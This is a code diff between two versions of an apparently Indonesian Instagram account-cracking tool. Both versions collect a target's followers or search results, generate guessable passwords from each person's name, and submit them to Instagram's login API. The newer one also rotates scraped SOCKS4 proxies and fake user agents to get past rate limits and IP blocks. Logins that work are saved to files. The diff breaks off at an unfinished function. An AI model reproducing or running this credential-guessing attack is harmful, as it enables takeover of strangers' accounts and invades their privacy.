@@ -1,705 +1,573 @@
-try:
-	import json
-	import uuid
-	import hmac
-	import random
-	import hashlib
-	import urllib
-	import stdiomask
-	import urllib.request
-	import calendar
-except ImportError as e:
-	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
-import requests,bs4,json,os,sys,random,datetime,time,re
-try:
-	import rich
-except ImportError:
-	os.system('pip install rich')
-	time.sleep(1)
-	try:
-		import rich
-	except ImportError:
-		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from time import sleep
-from concurrent.futures import ThreadPoolExecutor
-from datetime import datetime
-from bs4 import BeautifulSoup as parser
+#!/usr/bin/python2
+# coding=utf-8
+# Author: root#1697
+# Tool Instaram
+# Versi 0.1
+
+### IMPORT MODULE ###
+import os
+import requests
+import re
+import json
+import random
+import sys
+import platform
+import base64
+import datetime
+import subprocess
 import time
-day=datetime.now().strftime("%d-%b-%Y")
-nyMnD = 5
-nyMxD = 10
-current_GMT = time.gmtime(time.time())
-insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
-url='https://www.instagram.com'
-menudump=[]
+import calendar
+from calendar import monthrange
+from datetime import date
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+
 try:
-	os.mkdir('result')
+    import concurrent.futures
+except ImportError:
+    print k+"\n Modul Futures blom terinstall!..."
+    os.system("pip install futures" if os.name ==
+              "nt" else "pip2 install futures")
+try:
+    import requests
+except ImportError:
+    print k+"\n Modul Requests blom terinstall!..."
+    os.system("pip install requests" if os.name ==
+              "nt" else "pip2 install requests")
+
+### WARNA RANDOM ###
+P = '\x1b[1;97m'  # PUTIH
+M = '\x1b[1;91m'  # MERAH
+H = '\x1b[1;92m'  # HIJAU
+K = '\x1b[1;93m'  # KUNING
+B = '\x1b[1;94m'  # BIRU
+U = '\x1b[1;95m'  # UNGU
+O = '\x1b[1;96m'  # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+
+### GLOBAL NAME ###
+IP = requests.get('https://api.ipify.org').text
+ct = datetime.now()
+n = ct.month
+bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni',
+         'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+my_date = date.today()
+hr = calendar.day_name[my_date.weekday()]
+tanggal = ("%s-%s-%s-%s" % (hr, ha, op, ta))
+tgl = ("%s %s %s" % (ha, op, ta))
+
+data_ = []
+hasil_ok = []
+hasil_cp = []
+c = 1
+
+status_foll = []
+data_followers = []
+pencarian_ = []
+hastag = []
+
+try:
+    has_ok = open("ok.txt", "r").readlines()
+    with open("ok.txt", "w") as tul:
+        tul.write("")
+    for dev in set(has_ok):
+        with open("ok.txt", "a") as tu:
+            tu.write(dev)
 except:
-	pass
-	
+    pass
 try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-	open('.prox.txt','w').write(prox)
-except Exception as e:
-	print('GAGAL')
-	
-prox=open('.prox.txt','r').read().splitlines()
-CY='\033[96;1m'
-H='\033[1;32m' #HIJAU
-M='\033[1;31m' #MERAH
-K='\033[1;33m' #KUNING
-U='\033[1;35m' #UNGU
-O='\033[38;2;255;127;0;1m' #ORANGE
-C='\033[0m' #CLEAR
-B = '\x1b[1;94m' # BIRU
-N = '\x1b[0m' # WARNA MATI
-USN="Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
-ugen=open('ua.txt','r').read().splitlines()
-internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
-s=requests.Session()
-# CLEAR
-def clear():
-	os.system('clear')
-
-# BANNER
-def banner():
-	clear()
-	wel ='# SELAMAT MENIKMATI TOOLS E͠x͠p͠l͠o͠i͠d͠-͠n͠i͠t͠c͠h͠'
-	wel2 = mark(wel, style='purple')
-	sol().print(wel2)
-	au='AUTHOR    :  NITCH \nADMIN     :  JORDY\nWHATSAPP  :  +230 5297 0037'
-	pengembang1=(au)
-	cetak(nel(pengembang1, title='PENGEMBANG'))
-
-try:
-    # python 2
-	urllib_quote_plus = urllib.quote
+    has_cp = open("cp.txt", "r").readlines()
+    with open("cp.txt", "w") as tul:
+        tul.write("")
+    for dev in set(has_cp):
+        with open("cp.txt", "a") as tu:
+            tu.write(dev)
 except:
-    # python 3
-	urllib_quote_plus = urllib.parse.quote_plus
- 
+    pass
+url_instagram = "https://www.instagram.com/"
+user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
+user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
+user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
+                  "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
+headerz = {"User-Agent": user_agentz}
+headerz_api = {"User-Agent": user_agentz_api}
+
+### HAPUS COOKIE ###
 
 
-def cekAPI(cookie):
-    user=open('.username','r').read()
+def hapus_cookie():
     try:
-        c=s.get("https://www.instagram.com/%s/?__a=1"%(user),cookies={'cookie':cookie},headers={"user-agent":USN})
-        i=c.json()["graphql"]["user"]
-        nama=i["full_name"]
-        followers=i["edge_followed_by"]["count"]
-        following=i["edge_follow"]["count"]
-        external.append(f'{nama}|{followers}|{following}')
-    except  (ValueError,KeyError):
-        wel='# Instagram Checkpoint'
-        wel2 = mark(wel, style='red')
-        sol().print(wel2)
-        time.sleep(4)
-        os.remove('.kukis.log')
-        os.remove('.username')
+        os.system("del cookie.txt" if os.name == "nt" else "rm -f cookie.txt")
+    except:
+        pass
+
+
+def hapus_cokiz():
+    try:
+        os.system("del cokiz.txt" if os.name == "nt" else "rm -f cokiz.txt")
+    except:
+        pass
+
+### CEK LOGIN ###
+
+
+def cek_login():
+    global cookie
+    try:
+        cok = open("cookie.txt", "r").read()
+    except IOError:
+        login_dev()
+    else:
+        url = "https://i.instagram.com/api/v1/friendships/2220243163/followers/?count=5"
+        with requests.Session() as ses_dev:
+            try:
+                login_coki = ses_dev.get(
+                    url, cookies={"cookie": cok}, headers=headerz_api)
+                if "users" in json.loads(login_coki.content):
+                    cookie = {"cookie": cok}
+                else:
+                    print"\n %s[!] akun terkena checkpoint!" % (M)
+                    hapus_cookie()
+                    login_dev()
+            except ValueError:
+                print"\n %s[!] akun terkena checkpoint!" % (M)
+                hapus_cookie()
+                login_dev()
+
+
+None
+### LOGINAN ###
+
+
+def login_dev():
+    global cookie
+    os.system("clear")
+    logo()
+    print "  [ login akun instagram untuk lanjut ]"
+    username_dev = raw_input("\n [?] username instagram : ")
+    pass_dev = raw_input(" [?] password instagram : ")
+    try:
+        try:
+            headerz = {"User-Agent": user_agentz}
+            with requests.Session() as dev:
+                url_scrap = "https://www.instagram.com/"
+                data = dev.get(url_scrap, headers=headerz).content
+                crf_token = re.findall(
+                    '{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
+            header = {
+                "Accept": "*/*",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Host": "www.instagram.com",
+                "X-CSRFToken": crf_token,
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "User-Agent": user_agentz,
+            }
+            param = {
+                "username": username_dev,
+                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
+                "optIntoOneTap": False,
+                "queryParams": {},
+                "stopDeletionNonce": "",
+                "trustedDeviceRecords": {}
+            }
+        except:
+            header = {}
+            param = {}
+            pass
+        with requests.Session() as ses_dev:
+            url = "https://www.instagram.com/accounts/login/ajax/"
+            respon = ses_dev.post(url, data=param, headers=header)
+            data_dev = json.loads(respon.content)
+            da = respon.cookies.get_dict()
+
+            if "userId" in str(data_dev):
+                print"\n %s[✓] berhasil login ke akun" % (H)
+                for dev in da:
+                    with open("cookie.txt", "a") as tulis:
+                        tulis.write(dev+"="+da[dev]+";")
+                cok = open("cookie.txt", "r").read()
+                cookie = {"cookie": cok}
+
+            elif "checkpoint_url" in str(data_dev):
+                print"\n %s[!] akun terkena checkpoint!" % (M)
+
+            elif "Please wait" in str(data_dev):
+                print" %s[!] aktifkan mode pesawat 5 detik!" % (M)
+
+            else:
+                print m+"\n Gagal Login...."
+                exit()
+
+    except KeyboardInterrupt:
         exit()
 
-    return external,user
+### LOGO ###
 
-def login_kamu():
-    if "sukses" in lisensiku:
-        try:
-            kuki=open('.kukis.log','r').read()
-        except FileNotFoundError:
-            banner()
-            wel = '# Pilih Cara Kamu Login'
-            wel2 = mark(wel, style='blue')
-            sol().print(wel2)
-            io = '[1] Login Menggunakan Cookie\n[2] Login Menggunakan Username & Password'
-            oi = nel(io)
-            cetak(nel(oi))
-            loginpil=input(f"[•] Masukan Pilihan :{C} ")
-            if loginpil=='1':
-                wel = '# Gunakan username dan cookies instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
-                wel2 = mark(wel, style='red')
-                sol().print(wel2)
-                us=input(f'{C}[•] Masukan Username :{C}')
-                cok=input(f'{C}[•] Masukan Cookie :{C}')
-                kuki=open('.kukis.log','w').write(cok)
-                user=open('.username','w').write(us)
-                os.system('python ig1.py')
-            elif loginpil == '2':
-                login()
-        ex,user=cekAPI(kuki)
-        cookie={'cookie':kuki}
-        instagram(ex,user,cookie).menu()
+
+def logo():
+    os.system("clear")
+    print("""%s
+ ________             _____              _________
+ ____  _/_______________  /______ _      __  ____/
+  __  / __  __ \_  ___/  __/  __ `/_______  / __  
+ __/ /  _  / / /(__  )/ /_ / /_/ /_/_____/ /_/ /  
+ /___/  /_/ /_//____/ \__/ \__,_/        \____/   
+ """ % (N))
+
+### MENU ###
+
+
+def menu_dev():
+    logo()
+    print(" [*] Telegram    : t.me/INDOX0D3")
+    print(" [*] Date Time   : %s" % (tgl))
+    print(" [*] ---------------------------------------------")
+    print(" [*] IG Author   : %s@armn_gtw%s" % (H, N))
+    print(" [*] YT          : INDOX0D3")
+    print(" [*] ---------------------------------------------")
+    print(" [*] IP          : %s\n" % (IP))
+    print(" [ SELAMAT DATANG %sHAPPY CRACKING:*%s ]\n" % (K, N))
+    print(" [01]. CRACK DARI AKUN PUBLIK / crack from public account")
+    print(" [02]. CRACK DARI PENCARIAN / crack from searc")
+    print(" [03]. CEK HASIL AKUN CRACK / check cracked account")
+    print(" [%s00%s]. LOGOUT (HAPUS LOGIN)" % (M, N))
+    pil = raw_input("\n [?] PILIH MENU : ")
+    limit = ("100000")
+    if pil == "1" or pil == "01":
+        pas = ""
+        status = ""
+        username = raw_input(" [?] masukan username target : ")
+        info_dev(username, pas, status)
+
+        print("\n [ PILIH TARGET CRACK SATU² ]")
+        print("\n [1]. PENGIKUT %s : %s%s%s" % (username, H, str(pengikut), N))
+        print(" [2]. MENGIKUTI %s : %s%s%s" % (username, H, str(mengikuti), N))
+        pil2 = raw_input("\n [?] pilih : ")
+        if pil2 == "1":
+            data_follower_dev(cookie, id_, limit, pil2)
+            print("\n [*] hasil OK tersimpan di : ok.txt")
+            print(" [*] hasil CP tersimpan di : cp.txt \n")
+            crack()
+        elif pil2 == "2":
+            data_follower_dev(cookie, id_, limit, pil2)
+            print("\n [*] hasil OK tersimpan di : ok.txt")
+            print(" [*] hasil CP tersimpan di : cp.txt \n")
+            crack()
+        else:
+            pass
+    elif pil == "2" or pil == "02":
+        usr_ = raw_input(" [?] masukan nama pencarian (cth : yoga): ")
+        jm = input(" [?] masukan jumlah : ")
+        us = usr_.replace(" ", "")
+        pencarian_.append("iqbal_dev")
+        data_.append(us+"==>"+us)
+        data_.append(us+"_"+"==>"+us)
+        for dev in range(1, jm+1):
+            data_.append(us+str(dev)+"==>"+us)
+            data_.append(us+"_"+str(dev)+"==>"+us)
+            data_.append(us+str(dev)+"_"+"==>"+us)
+        print("\n [*] hasil OK tersimpan di : ok.txt")
+        print(" [*] hasil CP tersimpan di : cp.txt \n")
+        crack()
+    elif pil == "3" or pil == "02":
+        pas = ""
+        status = ""
+        username = raw_input(" [?] MASUKAN USERNAME TARGET : ")
+        hastag(cookie, username, limit)
+        crack()
+    elif pil == "4" or pil == "03":
+        print("\n [1] lihat hasil Live")
+        print(" [2] lihat hasil Chek")
+        pil = raw_input("\n [?] pilih : ")
+        if pil == "1":
+            try:
+                hasil_ok_ = open("ok.txt", "r").readlines()
+                print(" *-------------------------------------------------*")
+                print" [*] Hasil : "+H+"Live"+N+"   Total : "+str(len(hasil_ok_))
+                print("%s" % (H))
+                os.system('cat ok.txt')
+            except Exception as e:
+                print(e)
+            raw_input("\n%s [*] tekan enter untuk kembali ke menu " % (N))
+            menu_dev()
+        elif pil == "2":
+            try:
+                hasil_cp_ = open("cp.txt", "r").readlines()
+                print(" *-------------------------------------------------*")
+                print" [*] Hasil : "+K+"Check"+N+"   Total : "+str(len(hasil_cp_))
+                print("%s" % (K))
+                os.system('cat cp.txt')
+            except Exception as e:
+                print(e)
+            raw_input("\n%s [*] tekan enter untuk kembali ke menu " % (N))
+            menu_dev()
+        else:
+            exit(" [!] pilih yang bener!")
+    elif pil == "0" or pil == "00":
+        kel = raw_input(" [?] yakin mau keluar dari akun Instagram?[Y/t] : ")
+        if kel in ["y", "Y"]:
+            hapus_cookie()
+            print " [✓] berhasil keluar..."
+        else:
+            print" [*] silahkan jalan ulang toolsnya"
     else:
-        login()
-     
-def login():
-	global external
-	try:
-		wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
-		wel2 = mark(wel, style='red')
-		sol().print(wel2)
-		us=input(f"{C}[•] Masukan username: {C}")
-		pw=stdiomask.getpass(prompt=f'{C}[•] Masukan password: {C}')
-	except KeyboardInterrupt:
-		wel = '# KeyboardInterrupt terdeteksi... keluar !'
-		wel2 = mark(wel, style='red')
-		sol().print(wel2)
-		exit()
-	x=instagramAPI(us,pw).loginAPI()
-	if x.get('status')=='success':
-		open('.username','a').write(us)
-		open('.kukis.log','a').write(x.get('cookie'))
-		cookie={'cookie':x.get('cookie')}
-		print(f'\n{H}>{C} Login berhasil')
-		os.system('python ig.py')
-	elif x.get('status')=='checkpoint':
-		wel = '# Login checkpoint'
-		wel2 = mark(wel, style='red')
-		sol().print(wel2)
-		login()
-	else:
-		wel = '# Username atau password yang anda masukan salah'
-		wel2 = mark(wel, style='red')
-		sol().print(wel2)
-		login()
+        print" [!] isi pilhan dengan benar!"
+
+### DUMP PUBLIK ###
 
 
-class instagram:
-	def __init__(self,external,username,cookie):
-		self.ext=external
-		self.username=username
-		self.cookie=cookie
-		self.s=requests.Session()
-	def logo(self):
-		for i in external:
-			try:
-				nama=i.split('|')[0]
-				followers=i.split('|')[1]
-				following=i.split('|')[2]
-			except:
-				pass
-			banner()
-			welcome=f'''[{C}•{C}]Selamat Datang : {nama}
-[{C}•{C}]Username       : {self.username}
-[{C}•{C}]Followers      : {followers}
-[{C}•{C}]Following      : {following}'''
-			print(welcome)
-			io='[01] Crack Dari Pencarian\n[02] Crack Dari Pengikut\n[03] Crack dari Mengikuti\n[04] Check Status Crack\n[05] Lihat Hasil Crack\n[R] Laporkan Bug\n[C] Changelog\n[E] Exit'
-			oi = nel(io, title='MENU')
-			sol().print(oi)
-
-	def BUG(self):
-		bug=f'[•] Bantu saya mengembangkan script ini. apapun bugnya tolong laporkan kepada saya, semakin dikit bugnya semakin baik scriptnya.\n[•] Anda bisa melaporkan langsung ke wa admin +230 5297 0037\n[•]  NITCH ADMIN BAIK BANGET'
-		bug1 = nel(bug, style='cyan')
-		cetak(nel(bug1, title='REPORT BUG'))
-		exit()
-
-	def ChangeLog(self):
-		io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
-		oi = nel(io, style='cyan')
-		cetak(nel(oi, title='Fitur yang di update'))
-
-		io='[1] Bot unfollow instagram\n[2] Bot spam komen'
-		oi = nel(io, style='cyan')
-		cetak(nel(oi, title='Fitur tambahan'))
-
-		io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
-		oi = nel(io, style='cyan')
-		cetak(nel(oi, title='Fix Bug'))
-		exit()
-
-	def Exit(self):
-		kel='# Apakah anda yakin ingin keluar ?'
-		kel1=mark(kel,style='red')
-		sol().print(kel1)
-		x=input(f'\n{C}[•] Jawaban [y/t] : {C}')
-		if x in ('y','Y'):
-			os.remove('.kukis.log')
-			os.remove('.username')
-			os.system('python ig2.py')
-		elif x in ('t','T'):
-			os.system('python ig2.py')
-		else:
-			self.Exit()
-
-	def sixAPI(self,six_id):
-		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
-		x = requests.get(url)
-		x_jason = x.json()
-		uid = str( x_jason['users'][0].get("user").get("pk") )
-		return uid
-
-	def unfollowAPI(self,user_id,username_id,cookie):
-		uuid=generateUUID(True)
-		xx=self.s.get("https://www.instagram.com/",headers={"user-agent": uaku}).content
-		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
-		s.headers.update({'Connection': 'close',
-                       'Accept': '*/*',
-                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                       'Cookie2': '$Version=1',
-                       'Accept-Language': 'en-US',
-                       'User-Agent': uaku()})
-
-		data = json.dumps({'_uuid': uuid,
-                           '_uid': username_id,
-                           'user_id': user_id,
-                           '_csrftoken': crf_token})
-
-		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
-			self.generateUUID(False),
-			urllib.request.quote(data))
-		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
+def data_follower_dev(cookie, id_target, limit, opsi):
+    global c
+    if opsi == "1":
+        url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(
+            id_target, limit)
+    elif opsi == "2":
+        url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(
+            id_target, limit)
+    else:
+        exit(" Error..")
+    with requests.Session() as ses_dev:
+        res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
+        for dev in json.loads(res_dat_foll.content)["users"]:
+            username = dev["username"]
+            nama = dev["full_name"].encode("utf-8")
+            if len(status_foll) != 1:
+                #print("\r [*] mengambil user : %s%s%s"%(H,len(data_),N)),
+                # sys.stdout.flush()
+                data_.append(username+"==>"+nama.decode("utf-8"))
+                c += 1
+            else:
+                data_followers.append(username)
 
 
-	def searchAPI(self,cookie,nama):
-		try:
-			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
-			x_jason=json.loads(x.text)
-			for i in x_jason['users']:
-				user=i['user']
-				username=user['username']
-				fullname=user['full_name']
-				internal.append(f'{username}|{fullname}')
-		except requests.exceptions.ConnectionError:
-			exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
-		return internal
+None
 
-	def idAPI(self,cookie,id):
-		if 'sukses' in lisensiku:
-			try:
-				m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN})
-				m_jason=m.json()["graphql"]["user"]
-				idx=m_jason["id"]
-			except requests.exceptions.ConnectionError:
-				exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
-			except Exception as e:
-				exit(f"\n{M}┣[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
-			return idx
-		else:lisensi()
-
-	def infoAPI(self,cookie,api,id):
-		if 'sukses' in  lisensiku:
-			try:
-				idtar=f'# [•] TUNGGU SEDANG MENGUMPULKAN ID [•]'
-				idtar1=mark(idtar,style='yellow')
-				sol().print(idtar1)
-				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
-				x_jason=json.loads(x.text)
-				for i in x_jason['users']:
-					username = i["username"]
-					nama = i["full_name"]
-					internal.append(f'{username}|{nama}')
-					following.append(username)
-				if 'pengikut' in menudump:
-					maxid=x_jason['next_max_id']
-					for z in range (9999):
-						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
-						x_jason=json.loads(x.text)
-						try:
-							for i in x_jason['users']:
-								username = i["username"]
-								nama = i["full_name"]
-								internal.append(f'{username}|{nama}')
-								following.append(username)
-							try:
- 								maxid=x_jason['next_max_id']
-							except:
-								break
-						except:
-							if 'challenge' in x.text:
-								break
-							else:
-								continue
-				else:pass
-			except requests.exceptions.ConnectionError:
-				exit(f'\n{M}[!] Koneksi internet bermasalah{C}')
-			except Exception as e:
-				print(f'\n{M}[!] Username tidak di temukan{C}')
-			return internal
-		else:lisensi()
-
-	def passwordAPI(self,xnx):
-		idtar=f'# [•] TOTAL ID  : {len(internal)} [•]'
-		idtar1=mark(idtar,style='green')
-		sol().print(idtar1)
-		komb='[1] FirstName123 Firstname1234\n[2] FirtsName123 Firstname1234 Firstname12345 FullName\n[3] FirstName+123,FullName,Full Name'
-		komb1 = nel(komb, title='PILIHAN PASSWORD')
-		sol().print(komb1)
-		c=input(f'{C}[•] Masukan Pilihan :{C} ')
-		if c=='1':
-			self.generateAPI(xnx,c)
-		elif c=='2':
-			self.generateAPI(xnx,c)
-		elif c=='3':
-			self.generateAPI(xnx,c)
-		else:
-			self.passwordAPI(xnx)
-
-	def generateAPI(self,user,o):
-		io=f'[•] Hasil OK disimpan ke: result/{day}.txt\n[•] Hasil CP disimpan ke: result/{day}.txt'
-		oi = nel(io, title='PROSES CRACK')
-		sol().print(oi)
-		ipku='# [•] Jika alamat IP terkena spam hidupkan mode pesawat selama 10 detik'
-		ipku1=mark(ipku,style='red')
-		sol().print(ipku1)
-		with ThreadPoolExecutor(max_workers=15) as shinkai:
-			for i in user:
-				try:
-					username=i.split("|")[0]
-					password=i.split("|")[1].lower()
-					for w in password.split(" "):
-						if len(w)<3:
-							continue
-						else:
-							w=w.lower()
-							if o=="1":
-								if len(w)==3 or len(w)==4 or len(w)==5:
-									sandi=[w+'123',w+'1234']
-								else:
-									sandi=[w]
-							elif o=="2":
-								if len(w)==3 or len(w)==4 or len(w)==5:
-									sandi=[w+'123',w,w+'1234',w+'12345',w+'321',password.lower(),'sayang','anjing','bangsat']
-								else:
-									sandi=[w+'123',w,w+'1234',w+'12345']
-							elif o=="3":
-								if len(w)==3 or len(w)==4 or len(w)==5:
-									sandi=[w+'123',w,password.lower()]
-								else:
-									sandi=[w+'123',w,password.lower()]
-							shinkai.submit(self.crackAPI,username,sandi)
-				except:
-					pass
-		print('\n')
-		oi='# CRACK SELESAI'
-		io=mark(oi,style='yellow')
-		sol().print(io)
-		exit()
-
-	def APIinfo(self,user):
-		try:
-			x=s.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
-			x_jason=x.json()["graphql"]["user"]
-			nama=x_jason["full_name"]
-			pengikut=x_jason["edge_followed_by"]["count"]
-			mengikut=x_jason["edge_follow"]["count"]
-			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
-		except:
-			pass
-
-		return nama,pengikut,mengikut,postingan
-
-	def crackAPI(self,user,pas):
-		global loop,success,checkpoint
-		sys.stdout.write(f"\r{CY}┣[🐊] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
-		try:
-			for pw in pas:
-				ts = calendar.timegm(current_GMT)
-				nip=random.choice(prox)
-				proxs= {'http': 'socks4://'+nip}
-				aa='Mozilla/5.0 (Linux; Android '
-				b=random.choice(['4','5','6','7','8','9','10','11','12'])
-				c='SAMSUNG GT-'
-				d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-				e=random.randrange(1, 999)
-				f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-				g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-				h=random.randrange(73,100)
-				i='0'
-				j=random.randrange(4200,4900)
-				k=random.randrange(40,150)
-				l='Mobile Safari/537.36'
-				uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-				token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
-				headers = {
-					'Host': 'www.instagram.com',
-					'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
-					'x-ig-app-id': '1217981644879628',
-					'x-ig-www-claim': 'hmac.AR3rTw8coDXFSFwg2boEF949TcIRPhYyxFH8uftpHvSjbL76',
-					'sec-ch-ua-mobile': '?1',
-					'x-instagram-ajax': '78f5fe0e689b',
-					'content-type': 'application/x-www-form-urlencoded',
-					'accept': '*/*',
-					'x-requested-with': 'XMLHttpRequest',
-					'x-asbd-id': '198387',
-					'user-agent': uaku,
-					'sec-ch-ua-platform': '"Android"',
-					'x-csrftoken': token.cookies['csrftoken'],
-					'origin': 'https://www.instagram.com',
-					'sec-fetch-site': 'same-origin',
-					'sec-fetch-mode': 'cors',
-					'sec-fetch-dest': 'empty',
-					'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
-					'accept-encoding': 'gzip, deflate, br',
-					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-				}
-#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
+### DUMP PENCARIAN ###
 
 
-				param={
-					"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
-					"username": user,
-					"optIntoOneTap": 'false',
-					"queryParams": "{}",
-					"stopDeletionNonce": "",
-					"trustedDeviceRecords": "{}"}
-				x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
-				x_jason=json.loads(x.text)
-				if "userId" in str(x_jason):
-					nama,pengikut,mengikut,postingan=self.APIinfo(user)
-					io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
-					oi = nel(io, style='')
-					print('\n')
-					cetak(nel(oi, title='LIVE'))
-					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
-					success.append(user)
-					break
+def data_pencarian_dev(cookie, nama, limit):
+    url = "https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(
+        limit, nama)
+    with requests.Session() as ses_dev:
+        res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
+        for dev in json.loads(res_dat_pencarian.content)["users"]:
+            users = dev["user"]
+            print " Username:", users["username"]
+            print " Nama:", users["full_name"].encode("utf-8")
+            print "-"*50
 
-				elif 'checkpoint_url' in str(x_jason):
-					nama,pengikut,mengikut,postingan=self.APIinfo(user)
-					io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
-					print('\n')
-					oi=nel(io,style='yellow')
-					cetak(nel(oi, title='CHECKPOINT'))
-					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
-					checkpoint.append(user)
-					break
-
-				elif 'Please wait a few minutes' in str(x.text):
-					sys.stdout.write(f"\r┣[{U}!{C}] {U}IP KENA SPAM TUNGGU BEBERAPA MENIT{C}");sys.stdout.flush();sleep(0)
-#					self.crackAPI(user,pas)
-				elif 'ip_block' in str(x.text):
-					sys.stdout.write(f"\r┣[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
-					self.crackAPI(user,pas)
-				elif 'spam' in str(x.text):
-					sys.stdout.write(f"\r┣[{U}!{C}] {U}TERDETEKSI SPAM ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
-#					self.crackAPI(user,pas)
-
-				else:
-					continue
-
-			loop+=1
-		except:
-			self.crackAPI(user,pas)
-
-	def checkAPI(self,user,pw):
